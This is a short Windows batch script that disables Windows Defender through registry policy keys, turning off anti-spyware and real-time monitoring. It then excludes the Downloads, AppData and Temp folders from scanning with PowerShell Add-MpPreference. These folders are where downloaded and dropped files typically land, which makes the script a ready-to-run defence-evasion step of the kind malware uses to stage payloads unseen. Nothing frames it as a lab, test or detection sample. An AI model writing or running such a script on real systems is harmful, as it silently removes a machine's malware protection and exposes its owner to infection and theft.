@echo off
:: Disable Windows Defender features
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f

:: Add exclusions for specified file paths
powershell.exe Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\Downloads"
powershell.exe Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\AppData\Local"
powershell.exe Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\AppData\Roaming"
powershell.exe Add-MpPreference -ExclusionPath "C:\Windows\Temp"
powershell.exe Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\AppData\Local\Temp"

:: Optional: Restart Windows Defender service (requires administrative privileges)
:: net stop WinDefend
:: net start WinDefend

pause
